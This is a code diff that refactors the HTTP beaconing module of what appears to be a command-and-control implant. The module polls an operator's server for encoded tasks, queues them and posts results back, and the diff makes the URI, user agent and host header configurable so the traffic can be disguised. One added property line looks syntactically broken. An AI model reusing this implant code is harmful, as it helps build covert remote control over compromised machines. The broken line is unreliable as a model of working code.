@@ -1,6 +1,8 @@
 ﻿using Models.Tasks;
 using Extend;
 using CommModuleBase;
+using Tasking;
+
 using System;
 using System.Linq;
 using System.Net.Http;
@@ -17,7 +19,7 @@ namespace HttpModule
         public string ServerAddress { get; set; }
         public int ServerPort { get; set; }
         public string PayloadUUID { get; set; }
-        public string URI { get; set; } = "/data";
+        public string URI { get; set; };
         public string UserAgent { get; set; }
         public string HostHeader { get; set; }
         public int SleepTime { get; set; }
@@ -28,13 +30,16 @@ namespace HttpModule
         private CancellationTokenSource _cancellationTokenSource;
         private HttpClient _httpClient;
 
-        public HttpCommModule(string connectAddress, int connectPort, int sleepTime, CerberusMetadata metadata, string uuid)
+        public HttpCommModule(string connectAddress, int connectPort, int sleepTime, CerberusMetadata metadata, string uuid, string uri, string useragent, string hostheader)
         {
             ServerAddress = connectAddress;
             ServerPort = connectPort;
             SleepTime = sleepTime;
             Metadata = metadata;
             PayloadUUID = uuid;
+            URI = uri;
+            UserAgent = useragent;
+            HostHeader = hostheader;
         }
 
  /*       public HttpCommModule(string serverAddress, int serverPort, int sleepTime, CerberusMetadata metadata)
@@ -76,9 +81,9 @@ namespace HttpModule
             while (!_cancellationTokenSource.IsCancellationRequested)
             {
                 // do we have data to send?
-                if (!Outbound.IsEmpty)
+                if (!TaskHandler.Outbound.IsEmpty)
                 {
-                    await SendTaskingResponse();
+                    await SendTaskResults();
                 }
                 else
                 {
@@ -116,7 +121,7 @@ namespace HttpModule
             }
         }
 
-        private async Task GetTasking()
+        public override async Task GetTasking()
         {
             var getTasking = new GetTaskingRequest
             {
@@ -130,9 +135,9 @@ namespace HttpModule
             HandleTaskingResponse(responseContent);
         }
 
-        private async Task SendTaskingResponse()
+        public override async Task SendTaskResults()
         {
-            var outbound = GetOutbound();
+            var outbound = TaskHandler.GetOutbound();
             var taskingResponse = new PostTaskingRequest
             {
                 action = "post_response",
@@ -145,7 +150,7 @@ namespace HttpModule
             var response = await _httpClient.PostAsync(URI, content);
             var responseContent = await response.Content.ReadAsStringAsync();
 
-            HandlePostResponse(responseContent);
+            HandleFinalResponse(responseContent);
 
             if (Exit)
             {
@@ -153,7 +158,7 @@ namespace HttpModule
             }
         }
 
-        private void HandleTaskingResponse(string response)
+        public override void HandleTaskingResponse(string response)
         {
             var decodedResponse = Encoding.UTF8.GetString(Convert.FromBase64String(response));
             var json = decodedResponse.Substring(36);
@@ -164,7 +169,7 @@ namespace HttpModule
             {
                 foreach (var task in tasks)
                 {
-                    TaskHandler.TaskHandler.Inbound.Enqueue(task);
+                    TaskHandler.Inbound.Enqueue(task);
 
                     if (task.command.Equals("exit"))
                     {
@@ -174,7 +179,7 @@ namespace HttpModule
             }
         }
 
-        private void HandlePostResponse(string response)
+        public override void HandleFinalResponse(string response)
         {
             var decodedResponse = Encoding.UTF8.GetString(Convert.FromBase64String(response));
             var json = decodedResponse.Substring(36);
